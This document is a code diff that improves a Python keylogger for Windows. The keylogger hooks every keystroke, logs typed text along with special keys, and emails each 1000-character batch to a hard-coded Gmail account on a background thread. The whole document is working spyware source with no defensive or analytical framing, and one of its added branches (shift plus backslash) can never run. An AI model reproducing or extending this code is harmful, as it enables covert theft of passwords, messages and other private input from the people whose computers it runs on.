@@ -10,6 +10,7 @@ except ImportError:
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
+blnBackRemove = "True"  # set this to True if you prefer the program removes the last key if the user types backspace
 
 blnStop = "False"
 
@@ -62,29 +63,44 @@ def OnKeyboardEvent(event):
         SendMailThread.start()
         exit()
 
-    # if the user types "enter" move to a new line
-    if event.Key == "Return":
+    if event.Key == "Return": # if the user types "enter" move to a new line
         strLogs = strLogs + "\n"
     elif event.Key == "Space":
         strLogs = strLogs + " "
     elif event.Key == "Back":
-        strLogs = strLogs + " [back] "
+        if blnBackRemove == "True": # if the file is configured to delete the last key if backspaced is pressed
+            if not strLogs == "":
+                strLogs = strLogs[0:len(strLogs) - 1]
+        else:
+            strLogs = strLogs + " [Back] "
+    elif event.Key == "Delete":
+        strLogs = strLogs + " [Delete] "
     elif event.Key == "Tab":
         strLogs = strLogs + "\t"
-    elif event.Key == "Capital":
+    elif event.Key == "Oem_5": # if backslash is pressed
+        strLogs = strLogs + "\\"
+    # check to see if key is shift + backslash
+    elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
+        strLogs = strLogs + "|"
+    elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
         pass
+    elif len(event.Key) > 1: # check to see if key is a special key
+        strLogs = strLogs + " [" + event.Key + "] "
     else:
         # check to see if caps lock is on or the shift key is held down
         if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
             strLogs = strLogs + event.Key
         else:
+            # since event.Key outputs all keys as uppercase, lower normal ones
             strLogs = strLogs + ((event.Key).lower())
 
+    # set amount of characters until log will be sent out. Currently 1000 characters, roughly 160-200 words
     if len(strLogs) >= 1000:
         # create a new thread so that there is no delay while sending email
         SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
         SendMailThread.start()
         strLogs = ""
+    print(strLogs)
     return True
 
 hooks_manager = pyHook.HookManager()
